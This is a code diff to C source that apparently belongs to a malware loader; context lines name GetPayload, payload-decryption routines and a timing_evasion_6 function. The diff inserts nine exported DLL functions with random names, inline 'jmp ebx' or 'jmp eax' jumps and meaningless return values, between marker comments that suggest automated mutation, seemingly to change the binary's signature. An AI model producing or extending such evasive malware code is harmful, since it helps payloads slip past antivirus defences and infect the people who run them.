@@ -16,6 +16,18 @@
 
 
 // function prototypes
+__declspec(dllexport) long dfmqe(char* qbglmwgqktxrw);
+__declspec(dllexport) float hxdqdnwdaxzuij(long lbtafcydtk);
+__declspec(dllexport) float zxnvopedm(float dadfqegdgi);
+__declspec(dllexport) double hespssidzwzt(float xaqujjyqpabv);
+__declspec(dllexport) float lwkprxfri(char* paazulgrby);
+__declspec(dllexport) long tepjw(double tsszs);
+__declspec(dllexport) float xwhjvfff(char* czxtxthfx);
+__declspec(dllexport) char* bozjukbsmppw(char* grotwzds);
+__declspec(dllexport) long xryyg(char* bvoijpntlpqv);
+//replaceatbeginning9
+
+
 byte *GetPayload(void);
 byte *decrypted(byte *data, int length, int crytptkey);
 WCHAR *widedecrypt(byte *data, int length, int crytptkey);
@@ -1194,3 +1206,93 @@ int timing_evasion_6(void)
 	}
 
 */
+__declspec(dllexport) long dfmqe(char* qbglmwgqktxrw)
+ { 
+
+ 
+ __asm{ 
+ jmp ebx 
+ } 
+return 23961; 
+ }
+ //
+__declspec(dllexport) float hxdqdnwdaxzuij(long lbtafcydtk)
+ { 
+
+ 
+ __asm{ 
+ jmp ebx 
+ } 
+return 93355; 
+ }
+ //
+__declspec(dllexport) float zxnvopedm(float dadfqegdgi)
+ { 
+
+ 
+ __asm{ 
+ jmp ebx 
+ } 
+return 99902; 
+ }
+ //
+__declspec(dllexport) double hespssidzwzt(float xaqujjyqpabv)
+ { 
+
+ 
+ __asm{ 
+ jmp ebx 
+ } 
+return 80642; 
+ }
+ //
+__declspec(dllexport) float lwkprxfri(char* paazulgrby)
+ { 
+
+ 
+ __asm{ 
+ jmp ebx 
+ } 
+return 17326; 
+ }
+ //
+__declspec(dllexport) long tepjw(double tsszs)
+ { 
+
+ 
+ __asm{ 
+ jmp ebx 
+ } 
+return 47347; 
+ }
+ //
+__declspec(dllexport) float xwhjvfff(char* czxtxthfx)
+ { 
+
+ 
+ __asm{ 
+ jmp ebx 
+ } 
+return 33700; 
+ }
+ //
+__declspec(dllexport) char* bozjukbsmppw(char* grotwzds)
+ { 
+ 
+ __asm{ 
+ jmp eax 
+ } 
+return "kvedynfszqfps"; 
+ }
+ //
+__declspec(dllexport) long xryyg(char* bvoijpntlpqv)
+ { 
+
+ 
+ __asm{ 
+ jmp ebx 
+ } 
+return 15458; 
+ }
+ //
+//replacemeatend9
